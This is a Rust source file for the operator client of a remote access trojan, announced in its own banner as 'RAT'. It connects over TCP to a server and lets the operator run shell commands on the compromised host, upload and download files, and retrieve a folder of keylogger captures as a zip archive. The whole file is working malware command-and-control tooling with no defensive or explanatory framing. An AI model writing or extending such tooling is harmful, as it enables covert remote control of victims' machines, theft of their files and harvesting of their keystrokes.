use std::fs::File;
use std::io::{self, Read, Write};
use std::net::TcpStream;
use std::path::Path;

fn main() -> io::Result<()> {
    println!("Welcome to RAT");

    let mut stream = TcpStream::connect("127.0.0.1:8080")?;

    loop {
        // Prompt and read user input
        let input = read_user_input("Enter command, type \"help\" for a list of commands: ")?;
        let command = input.trim();

        match command.split_whitespace().next() {
            Some("help") => handle_help(),
            Some("upload") => handle_upload(&mut stream, command),
            Some("download") => handle_download(&mut stream, command),
            Some("keylogs") => download_folder(&mut stream, "Logs", "keylogs"),
            _ => handle_shell_command(&mut stream, command),
        }?;
    }
}

fn read_user_input(prompt: &str) -> io::Result<String> {
    print!("{}", prompt);
    io::stdout().flush()?;
    let mut input = String::new();
    io::stdin().read_line(&mut input)?;
    Ok(input)
}

fn handle_help() -> io::Result<()> {
    println!("\nupload {{filename}}  - Upload a file to the server");
    println!("download {{filename}} - Download a file from the server");
    println!("{{shell command}} - Execute shell commands to the server");
    println!("keylogs - Download keylog files as a zip folder from the server");
    println!("help - Show this help message with a list of commands");
    println!("exit - Disconnect from the server and exit the program\n");
    Ok(())
}

fn handle_upload(stream: &mut TcpStream, command: &str) -> io::Result<()> {
    let filename = command
        .split_whitespace()
        .nth(1)
        .expect("No file name provided");
    upload_file(stream, filename)
}

fn handle_download(stream: &mut TcpStream, command: &str) -> io::Result<()> {
    let filename = command
        .split_whitespace()
        .nth(1)
        .expect("No file name provided");
    download_file(stream, filename)
}

fn handle_shell_command(stream: &mut TcpStream, command: &str) -> io::Result<()> {
    send_message(stream, command)?;
    receive_response(stream)
}

fn send_message(stream: &mut TcpStream, message: &str) -> io::Result<()> {
    stream.write_all(message.as_bytes())?;
    stream.flush()?;
    Ok(())
}

fn receive_response(stream: &mut TcpStream) -> io::Result<()> {
    let mut buffer = [0; 1024];
    match stream.read(&mut buffer) {
        Ok(0) => {
            println!("Server disconnected.");
            Err(io::Error::new(
                io::ErrorKind::UnexpectedEof,
                "Server disconnected",
            ))
        }
        Ok(n) => {
            let response = String::from_utf8_lossy(&buffer[..n]);
            println!("\nSERVER RESPONSE:\n{}", response);
            Ok(())
        }
        Err(e) => {
            println!("Failed to read from stream: {}", e);
            Err(e)
        }
    }
}

fn upload_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
    let path = Path::new(filename);
    let mut file = File::open(path)?;

    send_message(stream, &format!("upload {}", filename))?;

    // Send file size
    let file_size = file.metadata()?.len();
    stream.write_all(&file_size.to_be_bytes())?;

    // Send file content
    let mut buffer = [0; 1024];
    while let Ok(n) = file.read(&mut buffer) {
        if n == 0 {
            break;
        }
        stream.write_all(&buffer[..n])?;
    }
    println!("File uploaded: {}", filename);
    Ok(())
}

fn download_file(stream: &mut TcpStream, filename: &str) -> io::Result<()> {
    send_message(stream, &format!("download {}", filename))?;

    let file_size = receive_file_size(stream)?;
    let mut file = File::create(filename)?;

    download_content(stream, &mut file, file_size)?;
    println!("File downloaded: {}", filename);
    Ok(())
}

fn download_folder(stream: &mut TcpStream, folder_name: &str, command: &str) -> io::Result<()> {
    send_message(stream, command)?;

    let file_size = receive_file_size(stream)?;
    let zip_filename = format!("{}.zip", folder_name);
    let mut file = File::create(&zip_filename)?;

    download_content(stream, &mut file, file_size)?;
    println!("Folder downloaded as a zip file: {}", zip_filename);
    Ok(())
}

fn receive_file_size(stream: &mut TcpStream) -> io::Result<u64> {
    let mut size_buffer = [0; 8];
    stream.read_exact(&mut size_buffer)?;
    Ok(u64::from_be_bytes(size_buffer))
}

fn download_content(stream: &mut TcpStream, file: &mut File, file_size: u64) -> io::Result<()> {
    let mut total_bytes_read = 0;
    let mut buffer = [0; 1024];

    while total_bytes_read < file_size {
        let n = stream.read(&mut buffer)?;
        total_bytes_read += n as u64;
        file.write_all(&buffer[..n])?;
    }
    Ok(())
}
